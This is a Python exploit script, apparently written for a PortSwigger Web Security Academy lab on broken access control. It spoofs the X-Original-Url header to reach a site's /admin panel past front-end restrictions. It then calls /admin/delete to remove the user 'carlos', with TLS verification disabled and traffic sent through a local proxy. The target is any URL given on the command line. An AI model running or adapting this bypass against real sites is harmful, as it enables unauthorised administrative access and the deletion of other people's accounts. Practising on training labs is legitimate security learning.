import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def get_methode(s,url,path,header,cookies):
    try:
        r=s.get(url=url+path,verify=False, proxies=proxies,headers=header,cookies=cookies)
        return r
    except Exception as e:
        print(colored(e,'red'))

def exploit(s,url):
    session_cookie = s.cookies.get_dict().get('session')
    cookies={'session' :session_cookie}
    path='/'
    X_Original_Url ='/admin'
    header={
        'Host': str(url).replace('https://',''),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Referer': 'https://0a6a0007048b5401810af76600d7001c.web-security-academy.net?username=wiener',
        'Sec-Gpc': '1',
        'X-Original-Url': X_Original_Url
    }
    r=get_methode(s,url,path,header,cookies)
    if r.status_code==200:
        print(colored('[+] we\'ve access to the admin panel successful','green'))
    else:
        print(colored('[+] we cannot access to the admin panel the exploit is unsuccessful','red'))
        sys.exit()

    # delete the user carlos 
    path='?username=carlos'
    header.update({'X-Original-Url': '/admin/delete'})
    r=get_methode(s,url,path,header,cookies)
    print(colored('[+] we\'ve delet to the carlos user successful','green'))

def main():
    banner(name='broken access control')
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    exploit(s,url=url)
    
    a="""  .-'''''-.
 ('    o o')
  |   '-'   |
  |  .-^-  |
   '-...-'
"""
    print('\n'+a)

main()